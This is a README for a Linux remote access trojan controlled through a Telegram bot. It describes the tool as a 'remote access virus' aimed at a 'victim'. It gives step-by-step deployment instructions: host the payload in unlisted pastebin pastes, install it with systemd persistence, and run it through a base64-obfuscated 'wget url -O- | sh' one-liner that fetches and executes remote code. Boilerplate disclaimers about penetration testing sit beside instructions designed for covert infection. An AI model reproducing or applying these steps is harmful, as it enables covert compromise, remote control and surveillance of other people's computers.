# linuxRAT-tgBot 🖤🐧
<sub>ignore the program's output during boot</sub>
##### Disclaimer ⚠️
- Neither the project nor its developer promote any kind of illegal activity and are **not** responsible for any misuse or damage caused by this project.
- This project is for the purpose of penetration **testing only**.
- Please do **not** use this tool on other people's devices without their permission.
- Do **not** use this tool to harm others.
- Use this project responsibly on your own devices **only**.
- It is the end user's **responsibility** to obey all applicable local, state, federal, and international laws.
- This software is meant for educational purposes only. I'm **not** responsible for any malicious use of the app.
- I'm **not** responsible for any malicious use of the app.

# Features 🔥
- this is a remote access virus (so-called RAT);
- the victim does not need a white IP ✨;
- management is carried out using a telegram bot;
- you just need to put the data in a configuration file and upload it all to [pastebin](https://pastebin.com/);
- easy to use

# Requirements 👀
+ python3
    + aiogram==3.0.0b6
    + requests
+ bash commands
    + WGET
	+ CURL
    + imagemagick (not necessarily)
	+ cd
	+ systemct ( systemd🐧 )
	+ sleep (not necessarily)
	+ echo (not necessarily)
	+ if 
	+ then
	+ mkdir
	+ apt (not necessarily)
	+ clear (not necessarily)
+ internet
+ linux!

# Install  🥷🏽
Well, let's start!
I use pastebin, you can use any text paste tool on the web.

1)Setup the bot's config:   
1.1) Copy all code from this [site](https://raw.githubusercontent.com/dentuwu/linuxRAT-tgBot/main/kernel.py).   
1.2) Paste this code in pastebin.com   
1.3) In the TOKEN ribbon, enter your bot token.   
1.4) In the ADMINS ribbon, enter the administrator's ID (listing the user's id in commas), so that only they can use the bot, the id can be taken in [this bot](t.me/myidbot).   
1.5) In the TIMEOUT ribbon, enter a timeout, if the command takes a long time to execute, it will be aborted after n (default 45) seconds.   

2) You should have it in the settings:     
+ Paste Expiration: 1 Week (recommended).    
+ Paste Exposure: Unlisted (so other users don't see your token and id).   

You should get it:   

![](https://github.com/dentuwu/linuxRAT-tgBot/raw/main/README-images/code.jpg "code kernel.py") 
 
![](https://github.com/dentuwu/linuxRAT-tgBot/raw/main/README-images/optional-paste-settings.jpg "settings paste")

2.1) **Touch** button "Create New Paste".     
3) Click on raw, and **save** the received link:     

![](https://github.com/dentuwu/linuxRAT-tgBot/raw/main/README-images/raw.jpg "rickroll")

4) Setup the install.sh config    
4.1) Copy all code from this [site]https://github.com/dentuwu/linuxRAT-tgBot/raw/main/install.sh).   
4.2) Paste this code in pastebin.com    
4.3) In the URL_KERNEL_PY ribbon, enter the link obtained in point 3.    

![](https://github.com/dentuwu/linuxRAT-tgBot/raw/main/README-images/url-kernel-py.jpg "url kernel py")

4.4) If possible, do the same with URL_KERNEL_SERVICE,URL_NO_ROOT_KERNEL_SERVICE, services are at [this link](https://github.com/dentuwu/linuxRAT-tgBot/tree/main/services), it is **not necessary**.     
4.5) Repeat the points 2.1 and 3.   

##### Using
Open a new terminal, and write this code :   
```bash
 echo "wget url  -O- | sh" | base64
```
Instead of **url**, there should be a link obtained in point 4.5   

You received something like this output - cmlja3JvbGwK, copy it and formulate a ready-made command to download the script and run it:   

```bash
 echo output | base64 -d | bash
```
 
Run this command (on your devices only)!  


## Tested   
**this is script tested on:**  
* Ubuntu 22.04 LTS  


